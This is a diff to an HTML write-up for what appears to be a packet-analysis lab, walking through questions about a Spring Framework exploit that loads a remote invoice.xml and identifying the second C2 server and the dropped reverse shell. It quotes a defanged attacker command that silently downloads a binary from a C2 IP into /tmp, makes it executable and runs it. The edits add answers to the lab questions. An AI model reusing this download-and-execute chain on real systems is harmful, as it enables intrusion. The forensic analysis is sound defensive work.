@@ -25,7 +25,7 @@
 
 <h2>Question 4 </h2>
 <b>The attacker's infrastructure often involves multiple components. What is the IP of the second C2 server? </b><br />
-<br> We followed a TCP stream in question 3 and noticed that a URL path hxxp[://]146[.]198[.]21[.]92:8888/invoice.xml pointing to an XML file named <b>invoice.xml</b> which seems to be path to an application configuration file. Using the "org.springframework.context.support.ClassPathXnlApplicationContext" which is a class from the Spring Framework used for loading application contexts fron XML files to load the invoice.xml file. Now, follow the HTTP stream of the frame that contains the URL, you will notice an enbedded script <b>"curl -s -o /tmp/docker hxxp[://]1120[.]199[.]52[.]72/docker; chmod +x /tmp/docker; /tmp/docker"</b> which downloads the file "docker" silently from hxxp[://]128[.]199[.]52[.]72/docker to the path /tmp/docker, makes it an executable and then executes the script.
+<br> We followed a TCP stream in question 3 and noticed that a URL path hxxp[://]146[.]198[.]21[.]92:8888/invoice.xml pointing to an XML file named <b>invoice.xml</b> which seems to be path to an application configuration file. Using the "org.springframework.context.support.ClassPathXnlApplicationContext" which is a class from the Spring Framework used for loading application contexts fron XML files to load the invoice.xml file. Now, follow the HTTP stream of the frame that contains the URL, you will notice an enbedded script <b>"curl -s -o /tmp/docker hxxp[://]128[.]199[.]52[.]72/docker; chmod +x /tmp/docker; /tmp/docker"</b> which downloads the file "docker" silently from hxxp[://]128[.]199[.]52[.]72/docker to the path /tmp/docker, makes it an executable and then executes the script. So, the server IP that contained the executable file is the C2 server.
 
 <p align="center">
 <img src="https://imgur.com/TiajAMr.png" height="100%" width="80%" alt="Enumeration_tool"/> 
@@ -33,14 +33,14 @@
 
 <h2>Question 5 </h2>
 <b>Attackers usually leave traces on the disk. What is the name of the reverse shell executable dropped on the server?</b><br />
-<br> 
+<br> Referencing the script observed within the invoice.xml file, the executable file stored in the /tmp directory is your answer or you can filter using the C2 server as a destination with a GET HTTP request method (iip.dst eq 128.199.52.72 and http.request.method eq GET). Follow the HTTP stream and you will seen the format of the file and the name of the file /br>
 <p align="center">
 <img src="https://imgur.com/XdVB8w8.png" height="100%" width="80%" alt="Admin_directory"/> 
 <br/>
 
 <h2>Question 6 </h2>
-<b>What is the vulnerable Java method and class that allows an attacker to run arbitrary code? (Format: Class.Method)</b><br />
-<br> <br />
+<b>What Java class was invoked by the XML file to run the exploit?</b><br />
+<br>Follow the HTTP stream of the invoice.xml file, then read the content of the file. You would see what you are looking for.<br />
 
 <p align="center">
 <img src="https://imgur.com/OPcixPu.png" height="100%" width="80%" alt="Credentials"/> 
